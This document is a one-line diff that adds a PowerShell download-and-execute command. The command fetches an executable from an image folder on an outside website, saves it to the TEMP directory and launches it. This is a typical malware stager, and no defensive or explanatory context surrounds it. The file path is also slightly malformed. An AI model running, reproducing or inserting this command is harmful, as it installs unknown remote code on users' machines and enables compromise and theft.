@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://www.pelicanlinetravels.com/images/xvcbkty.exe',"$env:TEMPxvcbkty.exe");Start-Process ("$env:TEMPxvcbkty.exe")
